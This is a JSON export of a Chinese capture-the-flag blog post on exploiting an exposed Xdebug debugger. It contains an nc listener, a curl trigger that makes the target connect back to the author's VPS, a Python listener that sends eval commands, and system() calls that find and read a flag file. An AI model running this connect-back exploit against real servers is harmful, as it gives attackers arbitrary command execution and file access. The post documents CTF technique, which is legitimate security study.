{"title":"Xdebug","slug":"Xdebug","date":"2019-08-17T15:23:45.000Z","updated":"2019-09-03T14:21:43.620Z","comments":true,"path":"api/articles/Xdebug.json","photos":[],"link":"","excerpt":"你从未见过的船新知识点","covers":null,"content":"<p>你从未见过的船新知识点</p>\n<a id=\"more\"></a>\n<h1 id=\"Xdebug\"><a href=\"#Xdebug\" class=\"headerlink\" title=\"Xdebug\"></a>Xdebug</h1><p>如何确定开启动态调试？</p>\n<p>在vps上监听9000端口  <code>nc -l -vv -p 9000</code></p>\n<p>再打开一个窗口执行 <code>curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39; -H &quot;X-Forwarded-For: VPS_IP&quot;</code></p>\n<p>如果此时监听窗口收到返回的xml数据则证明开启了动态调试。</p>\n<h2 id=\"如何利用\"><a href=\"#如何利用\" class=\"headerlink\" title=\"如何利用?\"></a>如何利用?</h2><p>Ricterz师傅写好了exp:</p>\n<pre><code>#!/usr/bin/python2\nimport socket\n\nip_port = (&apos;0.0.0.0&apos;,9000)\nsk = socket.socket()\nsk.bind(ip_port)\nsk.listen(10)\nconn, addr = sk.accept()\n\nwhile True:\n    client_data = conn.recv(1024)\n    print(client_data)\n\n    data = raw_input(&apos;&gt;&gt; &apos;)\n    conn.sendall(&apos;eval -i 1 -- %s\\x00&apos; % data.encode(&apos;base64&apos;))</code></pre><p>在vps上执行脚本，然后执行上文的curl代码触发Xdebug即可任意命令执行</p>\n<p>我们首先<code>system(&#39;find /|grep flag&#39;)</code> 找一下flag在哪，然后读取</p>\n<pre><code>system(&apos;cat /home/flag.txt&apos;)</code></pre><h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"http://0sec.com.cn/2018-05-10/\" target=\"_blank\" rel=\"noopener\">http://0sec.com.cn/2018-05-10/</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"Xdebuf","slug":"Xdebuf","count":1,"path":"api/tags/Xdebuf.json"},{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]}